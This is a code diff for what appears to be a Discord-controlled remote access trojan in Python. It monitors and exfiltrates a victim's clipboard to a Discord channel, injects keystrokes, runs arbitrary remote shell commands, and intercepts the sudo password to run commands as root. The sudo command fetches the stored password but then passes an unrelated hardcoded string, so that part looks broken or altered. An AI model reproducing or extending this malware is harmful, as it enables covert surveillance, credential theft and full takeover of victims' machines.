@@ -133,7 +133,7 @@ class clipboard_cog(commands.Cog):
         self.previous_clipboard = self.get_clipboard()
 
     def cog_unload(self) -> None:
-        self.check_clipboard.stop()
+        self.clipboard_monitor.stop()
 
     def get_clipboard(self):
         clipboard_content = pyperclip.paste()
@@ -142,9 +142,8 @@ class clipboard_cog(commands.Cog):
     def set_clipboard(self, text):
         pyperclip.copy(text)
         return text
-
-    @tasks.loop(seconds=3)
-    async def check_clipboard(self, ctx):
+    
+    def check_clipboard(self):
         try:
             clipboard = self.get_clipboard()
         except:
@@ -152,8 +151,15 @@ class clipboard_cog(commands.Cog):
 
         if clipboard != self.previous_clipboard:
             self.previous_clipboard = clipboard
+            return clipboard
+        else:
+            return 1
 
-            if len(clipboard) > 2000:
+    @tasks.loop(seconds=3)
+    async def clipboard_monitor(self, ctx):
+        clipboard = self.check_clipboard()
+        if clipboard != 1:
+            if len(clipboard) > 6000:
                 embed = embed_data(
                     title="Clipboard monitor",
                     description="Clipboard contents was too long",
@@ -167,6 +173,7 @@ class clipboard_cog(commands.Cog):
                     )
                 await ctx.send(embed=embed)
 
+
     @commands.group(name="clipboard", invoke_without_command=True)
     async def clipboard(self, ctx):
         await ctx.send("see help menu")
@@ -177,7 +184,7 @@ class clipboard_cog(commands.Cog):
 
     @monitor.command(name="start")
     async def start(self, ctx):
-        self.check_clipboard.start(ctx)
+        self.clipboard_monitor.start(ctx)
         embed = embed_data(
             title="Clipboard monitor started",
             description="Clipboard monitor mode was started, disable with `clipboard monitor stop`"
@@ -186,7 +193,7 @@ class clipboard_cog(commands.Cog):
 
     @monitor.command(name="stop")
     async def stop(self, ctx):
-        self.check_clipboard.stop()
+        self.clipboard_monitor.stop()
         embed = embed_data(
             title="Clipboard monitor stopped",
             description="Clipboard monitor mode was stopped, restart with `clipboard monitor start`",
@@ -196,7 +203,7 @@ class clipboard_cog(commands.Cog):
 
     @monitor.command(name="status")
     async def status(self, ctx):
-        if self.check_clipboard.is_running():
+        if self.clipboard_monitor.is_running():
             status = "Running"
             color = discord.Color.green()
         else:
@@ -213,6 +220,9 @@ class clipboard_cog(commands.Cog):
     async def get(self, ctx):
         clipboard_content = self.get_clipboard()
 
+        if len(clipboard_content) > 5999:
+            await ctx.send("clipboard contents too long")
+
         embed = embed_data(
             title="Extracted clipboard contents:",
             data=clipboard_content
@@ -220,8 +230,10 @@ class clipboard_cog(commands.Cog):
         await ctx.send(embed=embed)
 
     @clipboard.command(name="set")
-    async def set(self, ctx, text):
-        text = self.set_clipboard(text)
+    async def set(self, ctx, *args):
+        arg = ' '.join(args)
+
+        text = self.set_clipboard(arg)
 
         embed = embed_data(
             title="Set clipboard contents to:",
@@ -280,7 +292,7 @@ class keyboard_cog(commands.Cog):
                     self.pyautogui_hotkey(hotkeys)
 
 
-    @bot.group(name="keyboard", invoke_without_command=True)
+    @commands.group(name="keyboard", invoke_without_command=True)
     async def keyboard(self, ctx):
         await ctx.send("see help menu")
 
@@ -346,7 +358,7 @@ class shell_cog(commands.Cog):
             print("timed out")
             return 1
 
-    @bot.command(name="shell", invoke_without_command=True)
+    @commands.command(name="shell")
     async def shell(self, ctx, *args):
         args = list(args)
 
@@ -359,11 +371,10 @@ class shell_cog(commands.Cog):
                 break
         else:
             timeout = 30
-        print(timeout)
-        print(args)
 
         arg = ' '.join(args)
         print(arg)
+        print(timeout)
 
         output = await self.execute_shell(arg, timeout)
 
@@ -391,6 +402,20 @@ if isWindows == False:
         def __init__(self, bot):
             self.bot = bot
 
+        async def get_sudo(self, ctx):
+            try:
+                file = open(path + "passwd", "r")
+                sudo_password = file.read()
+                return sudo_password
+            except FileNotFoundError:
+                embed = embed_data(
+                    title="Sudo password",
+                    description="The sudo password has not yet been obtained. Run `!sudo password` to start listening for the sudo password",
+                    color=discord.Color.red()
+                    )
+                await ctx.send(embed=embed)
+                return 1
+
         async def check_passwd_file(self, ctx):
             embed = embed_data(title="Sudo password", description="Listening for root password started")
             await ctx.send(embed=embed)
@@ -398,7 +423,6 @@ if isWindows == False:
                 try:
                     file = open(path + "passwd", "r")
                     passwd = file.read()
-                    os.remove(path + "passwd")
                     return passwd
                 except FileNotFoundError:
                     print("no file")
@@ -437,18 +461,20 @@ done
 
         @sudo.command(name="password")
         async def password(self, ctx):
-            global sudo_password
             passwd = await self.intercept_sudo(ctx)
-            sudo_password = passwd
             embed = embed_data(title="Sudo password", description="Found sudo password:", data=passwd)
             await ctx.send(embed=embed)
 
         @sudo.command(name="shell")
         async def shell(self, ctx, *args):
-            global sudo_password
             print("ran as sudo")
-            added_sudo_args = ("echo", f"'{sudo_password}'", "|", "sudo", "-S") + args
-            await shell_cog.shell(ctx, *added_sudo_args)
+
+            sudo_password = await self.get_sudo(ctx)
+
+            if sudo_password != 1:
+                added_sudo_args = ("echo", "'anteroom-ripoff-analytic'", "|", "sudo", "-S") + args
+                print(added_sudo_args)
+                await shell_cog.shell(ctx, *added_sudo_args)
 
     
 
